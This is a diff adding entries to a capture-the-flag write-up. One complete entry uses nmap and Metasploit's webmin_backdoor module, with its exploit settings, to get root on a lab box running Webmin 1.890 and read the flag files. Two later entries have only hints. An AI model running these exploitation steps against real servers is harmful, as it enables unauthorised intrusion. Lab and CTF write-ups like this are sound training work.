@@ -583,3 +583,82 @@ It was a PDF file so I just opened it and the flag was at the bottom.
 `unxz` – Decompress XZ files.
 `mv` – Rename files.
 
+## :three::two: 32. Boot2Root(Medium) Admin Panel
+
+### Task Hint:
+Hello fellow IT professionals! I'm reaching out for assistance with security checks on our newly installed server. I've got a nagging feeling that something's off and I want to make sure our system is locked down tight. Can anyone help me scan for any vulnerabilities?
+
+### Solution:
+
+I used an nmap scan to discover open ports on the target IP.
+```
+nmap -sC -sV -oN initial_scan.txt <target_IP>
+```
+Open Ports:
+22 (SSH): OpenSSH 7.6p1
+10000 (HTTP): MiniServ 1.890 (Webmin)
+Discovered that the Webmin service was running on port 10000 and required HTTPS.
+
+Started Metasploit framework. `msfconsole`
+
+Did a search for webadmin and searched for exploits.
+
+Decided to use `use exploit/linux/http/webmin_backdoor`
+
+Configured Exploit Options:
+
+Set the target's IP address (RHOSTS):
+`set RHOSTS <Target_IP`
+Set the target's port (RPORT):
+`set RPORT 10000`
+Enabled SSL for HTTPS:
+`set SSL true`
+Set my attacking machine's IP address (LHOST):
+`set LHOST <my_ip_address>`
+
+Ran the exploit by using `run`
+
+I was able to establish a connection and checked for information.
+
+```
+whoami
+uname -a
+```
+Verified root access.
+
+Navigated to `/root` to capture the root flag:
+
+`cat /root/root.txt`
+
+Searched for the user flag in /home directories:
+
+`cat /home/*/user.txt`
+
+I found 2 flags in both of these directories and tried both.
+
+### Notes:
+The Webmin service was outdated (version 1.890) and had a known backdoor vulnerability.
+SSL mode was required for Webmin, so the SSL option in Metasploit had to be enabled.
+Ensuring correct configuration of LHOST, RHOSTS, and ports (RPORT/LPORT) was crucial for successful exploitation.
+#### Tools Used:
+Nmap: For initial reconnaissance and service detection.
+Metasploit Framework: For exploiting the Webmin backdoor vulnerability.
+Exploit Used: `exploit/linux/http/webmin_backdoor`
+
+## :three::three: 33. Boot2Root(Medium) A Window Opens
+
+### Task Hint:
+My PC is unhackable. I tested it myself. It's all thanks to Windows and it's amazing security features. You are welcome to try if you don't believe me!
+### Solution:
+
+### Notes:
+
+## :three::four: 34. Boot2Root (Insane) Contrabando
+
+### Task Hint:
+Our company was excited to release our new product, but a recent attacked has forced us to go down for maintenance. They have asked you to conduct a vulnerability assessment to help identify how the attacked occurred.
+
+Are you up for it?
+### Solution:
+
+### Notes:
